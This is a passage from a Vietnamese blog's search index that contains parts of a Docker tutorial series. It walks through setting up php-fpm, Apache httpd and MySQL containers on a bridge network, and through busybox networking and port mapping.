Docker","id":19,"section":"posts","tags":["Docker"],"title":"Tìm hiểu và sử dụng docker (P5)","uri":"https://minhlongmt183.github.io/posts/docker_p5/"},{"content":"\rToàn bộ series này được tham khảo từ hai nguồn chính: XuanThuLabChanel và DockerDoc. Em xin chân thành cảm ơn sự cống hiến của các tác giả của những kênh nói trên.❤️❤️❤️\rCài đặt, tạo và chạy PHP, phiên bản có PHP-FPM bằng Docker pull phiên bản image php-fpm từ docker hub Chúng ta tải bản 7.3-fpm từ docker hub. fpm ở đây có nghĩa là trong gói này, có thêm dịch vụ php-fpm. Dịch vụ này lắng nghe và tạo ra nhiều tiến trình php trên cổng 9000 chờ các webserver như http, nginx kết nối vào.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 ❯ docker pull php:7.3-fpm 7.3-fpm: Pulling from library/php 69692152171a: Pull complete 2040822db325: Pull complete 9b4ca5ae9dfa: Pull complete ac1fe7c6d966: Pull complete c342d9e76a3c: Pull complete 6ead8e46ae7b: Pull complete 5c98df0d7626: Pull complete dd302d19deb7: Pull complete 7701b71427d2: Pull complete 672353cf3439: Pull complete b379e47d0c20: Pull complete Digest: sha256:d38892103d2f76e3245a080875718d74414d6d7a57cfe7000a91f4aa668f870b Status: Downloaded newer image for php:7.3-fpm ❯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE newimage version2 a8e04dcf8737 2 days ago 170MB busybox latest 69593048aa3a 2 days ago 1.24MB php 7.3-fpm 2692864592ed 4 weeks ago 399MB ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB centos latest 300e315adb2f 6 months ago 209MB Tạo mạng bridge Đầu tiên chúng ta tạo một bride network có tên là www-net\n1 2 3 4 5 6 7 8 ❯ docker network create --driver bridge www-net 4d9c8d81da85fd9118cea666265aab88ae6ab71ac1d53a2dd81b168d87c9d290 ❯ docker network ls NETWORK ID NAME DRIVER SCOPE 286d5161c9f6 bridge bridge local 0f2ab02aa9f4 host host local 271997adaaa9 none null local 4d9c8d81da85 www-net bridge local Tạo thư mục chia sẻ dữ liệu giữa máy host và container Trên máy host, ta xây dựng một cây thư mục để lưu trữ dữ liệu chia sẻ với container như sau:\n1 2 3 4 5 6 7 . ├── docker │ └── data │ ├── c1.txt │ ├── data_container2.txt │ ├── d.txt │ └── www Về kiến thức liên quan về chia sẻ dữ liệu giữa máy host và container, bạn có thể xem kĩ hơn ở phần 2\nChạy container php-fpm Chúng ta tạo một container có tên là c-php\n1 2 3 4 5 ❯ docker run -d --name c-php -v /home/edisc/Desktop/docker/data:/home/SharedData --network www-net php:7.3-fpm 2894c033c93f5e4f2b02198afbb94cc9b5e62467b2e4c1291a7c2444f30659a7 ❯ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 2894c033c93f php:7.3-fpm \u0026#34;docker-php-entrypoi…\u0026#34; 2 minutes ago Up 2 minutes 9000/tcp c-php Ở đây, vì sau khi tạo chúng ta không muốn vào trực tiệp docker nên không dùng tùy chọn -it, tuy nhiên thêm lệnh -d để sau khi tạo docker tiếp tục chạy nền. Ỏ đây, tôi dùng linux nên quá trình diễn ra khá thuận lợi, nhưng theo tác giả thì nếu bạn dùng Windows hay MacOs thì cần phải thiết lập thư mục ở chế độ share với docker thì mới có thể tạo được. Chi tiết bạn có thể vào kênh của anh XuanThuLabChanel để xem rõ hơn. Bên cạnh đó, ta cũng thấy container mới được tạo này chạy đang chạy lệnh \u0026ldquo;docker-php-entrypoi…\u0026rdquo;, bản chất lệnh này dùng để gọi dịch vụ php-fpm để chạy và lắng nghe ở cổng 9000.\nKiểm tra php Chúng ta vào container vừa mới tạo, ôn lại kiến thức cũ, thay vì vào container bằng lệnh docker attach ta còn có một cách khác đó là thực thi câu lệnh bash trong container từ host thông qua docker exec\n1 2 ❯ docker exec -it c-php bash root@2894c033c93f:/var/www/html# Ta vào thư mục chia sẻ /home/SharedData/ để kiểm tra dữ liệu trên thư mục\n1 2 3 4 root@2894c033c93f:/var/www/html# cd /home/SharedData/ root@2894c033c93f:/home/SharedData# ls c1.txt\td.txt data_container2.txt www root@2894c033c93f:/home/SharedData# Trên máy host, ta tạo file test.php trong thư mục www và dễ thấy nó cũng hiện ở trong container.\nTiến hành chạy lệnh file test.php:\nTa đã chạy được php, php trên container là phiên bản PHP 7.3.28\n1 2 3 4 root@2894c033c93f:/home/SharedData/www# php --version PHP 7.3.28 (cli) (built: May 12 2021 13:46:47) ( NTS ) Copyright (c) 1997-2018 The PHP Group Zend Engine v3.3.28, Copyright (c) 1998-2018 Zend Technologies Cài đặt, chạy Apache HTTPD bằng Docker Tải image Apache httpd Chúng ta đã cài conatiner c-php, tiếp theo cài máy chủ httpd. Chúng ta tải image httpd phiên bản mới nhất về với câu lệnh quen thuộc:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ❯ docker pull httpd Using default tag: latest latest: Pulling from library/httpd 69692152171a: Already exists 7284b4e0cc7b: Pull complete 3678b2d55ccd: Pull complete aeb67982a725: Pull complete 06954f8169fd: Pull complete Digest: sha256:48bae0ac5d0d75168f1c1282c0eb21b43302cb1b5c5dc9fa3b4a758ccfb36fe9 Status: Downloaded newer image for httpd:latest ❯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE newimage version2 a8e04dcf8737 2 days ago 170MB busybox latest 69593048aa3a 2 days ago 1.24MB httpd latest 39c2d1c93266 2 weeks ago 138MB php 7.3-fpm 2692864592ed 4 weeks ago 399MB ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB centos latest 300e315adb2f 6 months ago 209MB Lấy cấu hình httpd.conf Khi htppd chạy, nó sẽ nạp file cấu hình trong đường dẫn ở container: /usr/local/apache2/conf/httpd.conf. Do đó, đây cũng là nơi để chúng ta muốn cấu hình tùy chỉnh theo ý muốn của mình.\nĐầu tiên, ta sẽ chạy tạm thời container httpd để trích xuất file cấu hình httpd.conf ra máy host trước.\n1 ❯ docker run --rm -v /home/edisc/Desktop/docker/data:/home/SharedData httpd cp /usr/local/apache2/conf/httpd.conf /home/SharedData/ Vì chúng ta chạy container này một lần để trích xuất file httpd.conf nên ta thêm tùy chọn --rm để docker sẽ tự động xóa sau khi chạy, bên cạnh đó, khi chạy container ta cũng thực hiện luôn câu lệnh copy file httpd.conf đến thư mục chia sẻ dữ liệu của mình. Sau khi chạy lệnh trên, chúng ta đã có file httpd.conf trên thư mục data ở host.\n1 2 ❯ ls c1.txt data_container2.txt d.txt httpd.conf www Cấu hình httpd.conf Sau khi có được file httpd.conf, ta mở ra và tiến hành cấu hình.\nMáy chủ apache được tạo ra sẽ tạo những file php thông qua proxy, tức là khi ta truy vấn đến những file có phần mở rộng là .php apache sẽ yêu cầu server chạy php-fpm để thi hành file php đó. Để sử dụng proxy cho apache, ta cần phải nạp các module về proxy cụ thể :\nBật một số module sau trong file httpd.conf: module mod_proxy.so và mod_proxy_fcgi.so\nThêm AddHandler Thêm AddHandler để chỉ thị apache chạy php thông qua proxy. Ta thêm dòng lệnh sau vào cuối file:\n1 AddHandler \u0026#34;proxy:fcgi://ip:9000\u0026#34; .php trường hợp này, ta truy vấn để container c-php nên ở ip ta thay thành c-php và cổng vẫn là 9000\nThiết lập thư mục mặc định của apache Để thiết lập thư mục mặc định khi chúng ta share, chúng ta sẽ thay đổi ở\n1 2 DocumentRoot \u0026#34;/usr/local/apache2/htdocs\u0026#34; \u0026lt;Directory \u0026#34;/usr/local/apache2/htdocs\u0026#34;\u0026gt; Thay đổi thành thư mục mà chúng ta muốn mount vào.\nChạy máy chủ Http Apache Ta chạy câu lệnh:\n1 docker run --network www-net --name c-httpd -h httpd -p 9999:80 -p 443:443 -v /home/edisc/Desktop/docker/data:/home/SharedData -v /home/edisc/Desktop/docker/data/httpd.conf:/usr/local/apache2/conf/httpd.conf httpd Ở đây:\nTa chạy một container có tên là c-httpd với hostname là httpd kết nối mạng www-net. Ánh xạ cổng 80, 443 của container lần lượt lên cổng 9999, 443 của máy host. Thư mục chia sẻ dữ liệu /home/edisc/Desktop/docker/data trên máy host được ánh xạ lên /home/SharedData trên container, và file cấu hình httpd.conf cũng được ánh xạ vào /usr/local/apache2/conf/httpd.conf.\nỞ đây lưu ý, khả năng chúng ta sẽ bị lỗi 1 2 docker: Error response from daemon: driver failed programming external connectivity on endpoint c-httpd (e0fa76873fc8a5b1b73a0e9589774a25d7a7c377a777d3af6c5313bf7c44adc7): Error starting userland proxy: listen tcp 0.0.0.0:443: bind: address already in use. ERRO[0000] error waiting for container: context canceled Tức là cổng mà chúng ta ánh xạ trên máy host đã được sử dụng bởi một tiến trình nào đó. Lúc bây giờ có 2 cách giải quyết:\nChọn cổng khác trên máy host Tìm các ứng dụng sử dụng cổng này rồi kill nó đi. Để tìm các cổng sử dụng ta dùng lệnh sudo netstat -pna | grep 443 với 443 là port mình cần tìm.\nTa được kết quả. 1 2 3 4 5 6 7 ❯ docker run --network www-net --name c-httpd -h httpd -p 9999:80 -p 443:443 -v /home/edisc/Desktop/docker/data:/home/SharedData -v /home/edisc/Desktop/docker/data/httpd.conf:/usr/local/apache2/conf/httpd.conf httpd [Thu Jun 10 08:10:54.751670 2021] [proxy_html:notice] [pid 1:tid 139955972379776] AH01425: I18n support in mod_proxy_html requires mod_xml2enc. Without it, non-ASCII characters in proxied pages are likely to display incorrectly. AH00558: httpd: Could not reliably determine the server\u0026#39;s fully qualified domain name, using 172.23.0.2. Set the \u0026#39;ServerName\u0026#39; directive globally to suppress this message [Thu Jun 10 08:10:54.767249 2021] [proxy_html:notice] [pid 1:tid 139955972379776] AH01425: I18n support in mod_proxy_html requires mod_xml2enc. Without it, non-ASCII characters in proxied pages are likely to display incorrectly. AH00558: httpd: Could not reliably determine the server\u0026#39;s fully qualified domain name, using 172.23.0.2. Set the \u0026#39;ServerName\u0026#39; directive globally to suppress this message [Thu Jun 10 08:10:54.771929 2021] [mpm_event:notice] [pid 1:tid 139955972379776] AH00489: Apache/2.4.48 (Unix) configured -- resuming normal operations [Thu Jun 10 08:10:54.772004 2021] [core:notice] [pid 1:tid 139955972379776] AH00094: Command line: \u0026#39;httpd -D FOREGROUND\u0026#39; Kiểm tra apache Như vậy ở bước trên máy chủ apache của chúng ta đã chạy. Để kiểm tra, ta tiến hành mở trình duyệt 127.0.0.1:9999 hoặc localhost:9999\nNhư vậy, máy chủ apache đã hoạt động hiệu quả. Chúng ta gọi file php để xem proxy có hoạt động không\nNhư vậy, proxy đã gọi được test.php.\nCài đặt, chạy MySQL bằng Docker Trong 2 phần trước, chúng ta đã tạo được 2 container, một container chạy php và một container chạy server apache httpd. Phần này chúng ta sẽ tiến hành cài đặt và chạy MySQL bằng Docker.\nThiết lập biến môi trường cho container Docker cho phép chúng ta thiết lập các biến môi trường cho container thông qua tùy chọn -e. Ví dụ, ta chạy một container từ image busybox, trong đó, thiết lập các biến môi trường cho container:\n1 2 3 4 5 6 ❯ docker run -it --rm -e BIEN1=VALUE1 -e BIEN2=\u0026#34;VALUE2\u0026#34; busybox / # echo $BIEN1 VALUE1 / # echo $BIEN2 VALUE2 / # Đây là cách thức nhiều image đóng gói và thiết lập biến môi trường giúp chúng ta thiết lập các container khi chạy.\nTải về phiên bản mysql Chúng ta tải phiên bản mới nhât của mysql bằng lệnh docker pull\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 ❯ docker pull mysql Using default tag: latest latest: Pulling from library/mysql 69692152171a: Already exists 1651b0be3df3: Pull complete 951da7386bc8: Pull complete 0f86c95aa242: Pull complete 37ba2d8bd4fe: Pull complete 6d278bb05e94: Pull complete 497efbd93a3e: Pull complete f7fddf10c2c2: Pull complete 16415d159dfb: Pull complete 0e530ffc6b73: Pull complete b0a4a1a77178: Pull complete cd90f92aa9ef: Pull complete Digest: sha256:d50098d7fcb25b1fcb24e2d3247cae3fc55815d64fec640dc395840f8fa80969 Status: Downloaded newer image for mysql:latest ❯ docker images REPOSITORY TAG IMAGE ID CREATED SIZE newimage version2 a8e04dcf8737 2 days ago 170MB busybox latest 69593048aa3a 2 days ago 1.24MB httpd latest 39c2d1c93266 2 weeks ago 138MB php 7.3-fpm 2692864592ed 4 weeks ago 399MB mysql latest c0cdc95609f1 4 weeks ago 556MB ubuntu latest 7e0aa2d69a15 6 weeks ago 72.7MB centos latest 300e315adb2f 6 months ago 209MB Một số thông tin chính cần chú ý trước khi bắt đầu làm việc với mysql:\nport: 3384 MYSQL 8.0 có thể có một số máy cũ không hỗ trợ, có thể cần cấu hình để hệ thống cũ có thể login vào mysql này. khi đó ta thêm vào file config nội dung sau: [mysqld]\rdefault-authentication-plugin=mysql_native_password file config: /etc/mysql/my.cnf của container Biến môi trường: Tài khoản root:MYSQL_ROOT_PASSWORD database: /var/lib/mysql Lấy file cấu hình my.cnf Chúng ta chạy file mysql và trích xuất file my.cnf ra.\n1 2 3 ❯ docker run --rm -v /home/edisc/Desktop/docker/data:/home/SharedData mysql cp /etc/mysql/my.cnf /home/SharedData/ ❯ ls c1.txt data_container2.txt d.txt httpd.conf my.cnf www Cấu hình file my.cnf Ta thêm dòng lệnh 1 default-authentication-plugin=mysql_native_password vào cuối file my.cnf\nTạo thêm thư mục db trong folder /home/edisc/Desktop/docker/data để lưu trữ dữ liệu, đồng thời khi xóa container đi thì csdl của nó cũng không bị mất đi. Tạo container mysql Chúng ta tạo docker để chạy mysql, trong đó:\nThiết lập biến môi trường để lưu mật khẩu cho tài khoản root, mật khẩu ta chọn là docker123:\n-e MYSQL_ROOT_PASSWORD=docker123, Ánh xạ file cấu hình my.cnf lên thực mục cấu hình trên container:\n-v /home/edisc/Desktop/docker/data/my.cnf:/etc/mysql/my.cnf, Ánh xạ thư mục db trên host lên thư mục lưu trữ databse mặc định của container:\n-v /home/edisc/Desktop/docker/data/db:/var/lib/mysql Tên là c-mysql: --name c-mysql 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ❯ docker run -e MYSQL_ROOT_PASSWORD=docker123 -v /home/edisc/Desktop/docker/data/my.cnf:/etc/mysql/my.cnf -v /home/edisc/Desktop/docker/data/db:/var/lib/mysql --name c-mysql mysql 2021-06-10 09:02:24+00:00 [Note] [Entrypoint]: Entrypoint script for MySQL Server 8.0.25-1debian10 started. 2021-06-10 09:02:25+00:00 [Note] [Entrypoint]: Switching to dedicated user \u0026#39;mysql\u0026#39; 2021-06-10 09:02:25+00:00 [Note] [Entrypoint]: Entrypoint script for MySQL Server 8.0.25-1debian10 started. 2021-06-10 09:02:25+00:00 [Note] [Entrypoint]: Initializing database files 2021-06-10T09:02:25.233559Z 0 [System] [MY-013169] [Server] /usr/sbin/mysqld (mysqld 8.0.25) initializing of server in progress as process 43 2021-06-10T09:02:25.244471Z 1 [System] [MY-013576] [InnoDB] InnoDB initialization has started. 2021-06-10T09:02:26.680645Z 1 [System] [MY-013577] [InnoDB] InnoDB initialization has ended. 2021-06-10T09:02:29.942913Z 6 [Warning] [MY-010453] [Server] root@localhost is created with an empty password ! Please consider switching off the --initialize-insecure option. 2021-06-10 09:02:38+00:00 [Note] [Entrypoint]: Database files initialized 2021-06-10 09:02:38+00:00 [Note] [Entrypoint]: Starting temporary server 2021-06-10T09:02:39.196368Z 0 [System] [MY-010116] [Server] /usr/sbin/mysqld (mysqld 8.0.25) starting as process 88 2021-06-10T09:02:39.243106Z 1 [System] [MY-013576] [InnoDB] InnoDB initialization has started. 2021-06-10T09:02:39.910377Z 1 [System] [MY-013577] [InnoDB] InnoDB initialization has ended. 2021-06-10T09:02:40.126089Z 0 [System] [MY-011323] [Server] X Plugin ready for connections. Socket: /var/run/mysqld/mysqlx.sock 2021-06-10T09:02:40.376702Z 0 [Warning] [MY-010068] [Server] CA certificate ca.pem is self signed. 2021-06-10T09:02:40.377098Z 0 [System] [MY-013602] [Server] Channel mysql_main configured to support TLS. Encrypted connections are now supported for this channel. ... Chúng ta không thiết lập tham số ánh xạ cổng vì ở đây chưa có nhu cầu truy cập từ bên ngoài vào csdl c-mysql mà csdl này chỉ để cho c-php và c-httpd truy cập thông qua cổng 3306. Trong thực tế, chúng ta muốn truy cập từ xa, để các server kết nối với nhau, ta cần ánh xạ cổng 3306 này tới máy host.\nThi hành một số lệnh trong container c-mysql Đến đây, chúng ta đã thiết lập được một container chạy mysql, tiếp theo chúng ta vào container trên để chạy một số câu lệnh để kiểm tra.\nVào container c-mysql Đầu tiên, vào container c-mysql bằng lệnh docker exec:\n1 2 3 4 5 6 7 ❯ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 10c415b14dbe mysql \u0026#34;docker-entrypoint.s…\u0026#34; 5 minutes ago Up 5 minutes 3306/tcp, 33060/tcp c-mysql 7e8910d1b55c php:7.3-fpm \u0026#34;docker-php-entrypoi…\u0026#34; 43 minutes ago Up 43 minutes 9000/tcp c-php a9d05fe2fc94 httpd \u0026#34;httpd-foreground\u0026#34; About an hour ago Up 34 minutes 0.0.0.0:443-\u0026gt;443/tcp, 0.0.0.0:9999-\u0026gt;80/tcp c-httpd ❯ docker exec -it c-mysql bash root@10c415b14dbe:/# Kết nối với mysql mysql của chúng ta có username là root và có password là docker123 (thiết lập ở trên). Tham số -pdocker123 giúp chúng ta không cần phải nhập lại password.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 root@10c415b14dbe:/# mysql -u root -pdocker123 mysql: [Warning] Using a password on the command line interface can be insecure. Welcome to the MySQL monitor. Commands end with ; or \\g. Your MySQL connection id is 8 Server version: 8.0.25 MySQL Community Server - GPL Copyright (c) 2000, 2021, Oracle and/or its affiliates. Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners. Type \u0026#39;help;\u0026#39; or \u0026#39;\\h\u0026#39; for help. Type \u0026#39;\\c\u0026#39; to clear the current input statement. mysql\u0026gt; Như vậy chúng ta đã kết nối được mysql và vào bên trong của sql-server.\nKiểm tra có những database nào trong mysql 1 2 3 4 5 6 7 8 9 10 11 mysql\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | sys | +--------------------+ 4 rows in set (0.00 sec) mysql\u0026gt; Sử dụng database mysql 1 2 3 4 5 6 mysql\u0026gt; use mysql; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed mysql\u0026gt; Show table 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 mysql\u0026gt; show tables; +------------------------------------------------------+ | Tables_in_mysql | +------------------------------------------------------+ | columns_priv | | component | | db | | default_roles | | engine_cost | | func | | general_log | | global_grants | | gtid_executed | | help_category | | help_keyword | | help_relation | | help_topic | | innodb_index_stats | | innodb_table_stats | | password_history | | plugin | | procs_priv | | proxies_priv | | replication_asynchronous_connection_failover | | replication_asynchronous_connection_failover_managed | | role_edges | | server_cost | | servers | | slave_master_info | | slave_relay_log_info | | slave_worker_info | | slow_log | | tables_priv | | time_zone | | time_zone_leap_second | | time_zone_name | | time_zone_transition | | time_zone_transition_type | | user | +------------------------------------------------------+ 35 rows in set (0.00 sec) mysql\u0026gt; Tạo dữ liệu 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 mysql\u0026gt; CREATE USER \u0026#39;testuser\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED BY \u0026#39;testpass\u0026#39;; Query OK, 0 rows affected (0.03 sec) mysql\u0026gt; create database db_test; Query OK, 1 row affected (0.02 sec) mysql\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | db_test | | information_schema | | mysql | | performance_schema | | sys | +--------------------+ 5 rows in set (0.00 sec) mysql\u0026gt; select User from user; +------------------+ | User | +------------------+ | root | | testuser | | mysql.infoschema | | mysql.session | | mysql.sys | | root | +------------------+ 6 rows in set (0.00 sec) Như vậy ta có các user là: root và testuser. Với testuser có password là testpass.\nKết luận Trong bài học này, chúng ta đã học được từ anh XuanThuLabChanel cách cấu hình ra 3 container chạy 3 dịch vụ khác nhau: mysql, php, máy chủ web apache httpd. trong đó máy chủ web truy cập được cổng 9999 trên host. Trong bài tiếp theo, chúng ta sẽ cài đặt wordpress vào hệ thống này.\n","description":"Phần này chúng ta sẽ học về : cài đặt và cấu hình một hệ thống trên docker gồm  3 container chạy 3 dịch vụ khác nhau: mysql, php, máy chủ web apache httpd. trong đó máy chủ web truy cập được cổng 9999 trên host","id":20,"section":"posts","tags":["Docker"],"title":"Tìm hiểu và sử dụng docker (P4)","uri":"https://minhlongmt183.github.io/posts/docker_p4/"},{"content":"\rToàn bộ series này được tham khảo từ hai nguồn chính: XuanThuLabChanel và DockerDoc. Em xin chân thành cảm ơn sự cống hiến của các tác giả của những kênh nói trên.❤️❤️❤️\rGiới thiệu về Image Busybox Busybox là một image rất nhỏ gọn nhưng chứa rất nhiều công cụ dựa trên nền tảng linux.\nTải image busybox:\n1 2 3 4 5 6 ❯ docker pull busybox Using default tag: latest latest: Pulling from library/busybox b71f96345d44: Pull complete Digest: sha256:930490f97e5b921535c153e0e7110d251134cc4b72bbb8133c6a5065cc68580d Status: Downloaded newer image for busybox:latest Tạo một container chạy image busybox\n1 2 ❯ docker run -it --rm busybox / # Option --rm dùng cho những container muốn chạy một lần, sau khi chạy xong docker sẽ tự động xóa container đó đi.\nContainer của image busybox có rất nhiều lệnh, để liệt kê các lệnh, ta dùng:\n1 2 3 4 5 6 7 / # ls /bin/ -la total 449700 drwxr-xr-x 2 root root 12288 Jun 7 17:34 . drwxr-xr-x 1 root root 4096 Jun 9 16:00 .. -rwxr-xr-x 400 root root 1149184 Jun 7 17:34 [ -rwxr-xr-x 400 root root 1149184 Jun 7 17:34 [[ -rwxr-xr-x 400 root root 1149184 Jun 7 17:34 acpid Giới thiệu mạng, network trong docker, mạng bridge Liệt kê các mạng có trong docker. Kiểm tra trong docker có những mạng nào, ta dùng lệnh:\n1 2 3 4 5 ❯ docker network ls NETWORK ID NAME DRIVER SCOPE e0b165102300 bridge bridge local 0f2ab02aa9f4 host host local 271997adaaa9 none null local Ở đây chúng ta có 3 network được tạo mặc định khi docker tạo, bao gồm: bridge dùng DRIVER bridge, host dùng DRIVE host và none dùng DRIVE null.\nKiểm tra thông tin network Để kiểm tra thông tin về một network cũng như những container nào kết nối vào, ta dùng lệnh:\ndocker network inspect \u0026lt;NAME\u0026gt;\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 ❯ docker network inspect bridge [ { \u0026#34;Name\u0026#34;: \u0026#34;bridge\u0026#34;, \u0026#34;Id\u0026#34;: \u0026#34;e0b1651023003b4e6235e7b45319daa20d80a247d66e0b303eaf5e53fb90f0f8\u0026#34;, \u0026#34;Created\u0026#34;: \u0026#34;2021-06-09T20:59:15.89942017+07:00\u0026#34;, \u0026#34;Scope\u0026#34;: \u0026#34;local\u0026#34;, \u0026#34;Driver\u0026#34;: \u0026#34;bridge\u0026#34;, \u0026#34;EnableIPv6\u0026#34;: false, \u0026#34;IPAM\u0026#34;: { \u0026#34;Driver\u0026#34;: \u0026#34;default\u0026#34;, \u0026#34;Options\u0026#34;: null, \u0026#34;Config\u0026#34;: [ { \u0026#34;Subnet\u0026#34;: \u0026#34;172.17.0.0/16\u0026#34;, \u0026#34;Gateway\u0026#34;: \u0026#34;172.17.0.1\u0026#34; } ] }, \u0026#34;Internal\u0026#34;: false, \u0026#34;Attachable\u0026#34;: false, \u0026#34;Ingress\u0026#34;: false, \u0026#34;ConfigFrom\u0026#34;: { \u0026#34;Network\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;ConfigOnly\u0026#34;: false, \u0026#34;Containers\u0026#34;: {}, \u0026#34;Options\u0026#34;: { \u0026#34;com.docker.network.bridge.default_bridge\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;com.docker.network.bridge.enable_icc\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;com.docker.network.bridge.enable_ip_masquerade\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;com.docker.network.bridge.host_binding_ipv4\u0026#34;: \u0026#34;0.0.0.0\u0026#34;, \u0026#34;com.docker.network.bridge.name\u0026#34;: \u0026#34;docker0\u0026#34;, \u0026#34;com.docker.network.driver.mtu\u0026#34;: \u0026#34;1500\u0026#34; }, \u0026#34;Labels\u0026#34;: {} } ] Ở đây chúng ta chú ý, trường Container rỗng, có nghĩa là không có container nào kết nối vào.\nMạng bridge. Ta tiến hành tạo một container B1 và kiêm tra lại mạng bridge.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 ❯ docker run -it --name B1 busybox / # % ❯ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 2f6dd1dda04d busybox \u0026#34;sh\u0026#34; 9 seconds ago Up 8 seconds B1 ❯ docker network inspect bridge [ { \u0026#34;Name\u0026#34;: \u0026#34;bridge\u0026#34;, \u0026#34;Id\u0026#34;: \u0026#34;e0b1651023003b4e6235e7b45319daa20d80a247d66e0b303eaf5e53fb90f0f8\u0026#34;, \u0026#34;Created\u0026#34;: \u0026#34;2021-06-09T20:59:15.89942017+07:00\u0026#34;, \u0026#34;Scope\u0026#34;: \u0026#34;local\u0026#34;, \u0026#34;Driver\u0026#34;: \u0026#34;bridge\u0026#34;, \u0026#34;EnableIPv6\u0026#34;: false, \u0026#34;IPAM\u0026#34;: { \u0026#34;Driver\u0026#34;: \u0026#34;default\u0026#34;, \u0026#34;Options\u0026#34;: null, \u0026#34;Config\u0026#34;: [ { \u0026#34;Subnet\u0026#34;: \u0026#34;172.17.0.0/16\u0026#34;, \u0026#34;Gateway\u0026#34;: \u0026#34;172.17.0.1\u0026#34; } ] }, \u0026#34;Internal\u0026#34;: false, \u0026#34;Attachable\u0026#34;: false, \u0026#34;Ingress\u0026#34;: false, \u0026#34;ConfigFrom\u0026#34;: { \u0026#34;Network\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;ConfigOnly\u0026#34;: false, \u0026#34;Containers\u0026#34;: { \u0026#34;2f6dd1dda04d0ab42434a6cff6f9c7eb42474f81acdf32809486f8fa82be8951\u0026#34;: { \u0026#34;Name\u0026#34;: \u0026#34;B1\u0026#34;, \u0026#34;EndpointID\u0026#34;: \u0026#34;0af6a3739786e89d5161f25edf7bb2a5d900ab580ab53e8f852a197134e010b7\u0026#34;, \u0026#34;MacAddress\u0026#34;: \u0026#34;02:42:ac:11:00:02\u0026#34;, \u0026#34;IPv4Address\u0026#34;: \u0026#34;172.17.0.2/16\u0026#34;, \u0026#34;IPv6Address\u0026#34;: \u0026#34;\u0026#34; } }, \u0026#34;Options\u0026#34;: { \u0026#34;com.docker.network.bridge.default_bridge\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;com.docker.network.bridge.enable_icc\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;com.docker.network.bridge.enable_ip_masquerade\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;com.docker.network.bridge.host_binding_ipv4\u0026#34;: \u0026#34;0.0.0.0\u0026#34;, \u0026#34;com.docker.network.bridge.name\u0026#34;: \u0026#34;docker0\u0026#34;, \u0026#34;com.docker.network.driver.mtu\u0026#34;: \u0026#34;1500\u0026#34; }, \u0026#34;Labels\u0026#34;: {} } ] Xem lại trường container thì đã thấy có thêm một container có tên là B1 đang chạy. Ngoài ra chúng ta còn có thể kiếm tra container đang dùng mạng nào và được cấp địa chỉ IP bằng bao nhiêu thông qua lệnh docker inspect \u0026lt;container_name\u0026gt;\nTạo ra thêm 1 container tên B2, khi đó container B1, B2 có thể nhìn thấy nhau, chúng ta có thể kiểm tra thông qua lệnh ping.\nTrong image busybox, có sẵn một công cụ để tạo máy chủ web http. Giả sử ta muốn cho container B2 chạy máy chủ web http, chúng ta vào /var/www và chạy lệnh httpd\n1 2 3 4 5 6 7 ❯ docker attach B2 / # cd var/ /var # ls spool www /var # cd www/ /var/www # httpd /var/www # Tạo một file index.html với nội dung là:\n1 web server is running... Từ container B1, ta tiến hành wget tới B2\n1 2 3 4 5 6 7 8 ❯ docker attach B1 / # wget -O - 172.17.0.3 Connecting to 172.17.0.3 (172.17.0.3:80) writing to stdout web server is running... - 100% |********************************| 25 0:00:00 ETA written to stdout / # Với 172.17.0.3 là địa chỉ của container B2, có thể xem bằng lệnh docker network inspect bridge. Rõ ràng, container B1 đã đọc được file index mà B2 trả về với dòng chữ web server is running...\nÁnh xạ cổng mạng trong docker Ánh xạ cổng mạng B2 đang mở cổng 80, máy host của chúng ta đang có địa chỉ là 127.0.0.1, chúng ta muốn từ ngoài mạng truy cập được tới container B2 thì phải ánh xạ cổng 80 của B2 tới một cổng nào đó của host. Trong ví dụ này, chúng ta sẽ thiết lập truy cập đến cổng 80 của B2 thông qua cổng 8888 ip máy host 127.0.0.1.\nĐiều này được làm ở bước tạo container B2, lúc tạo chúng ta sẽ ánh xạ cổng 80 tới cổng 8888 của máy host. Cú pháp như sau:\ndocker run -it --name \u0026lt;name\u0026gt; -p \u0026lt;host_port\u0026gt;:\u0026lt;container_port\u0026gt; image\n1 2 ❯ docker run -it --name B2 -p 8888:80 busybox / # Khi kiểm tra bằng lệnh docker ps ta sẽ thấy container B2 đã ánh xạ cổng 80 lệnh 8888 của máy host ở PORT.\n1 2 3 ❯ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES bdd19faad9cf busybox 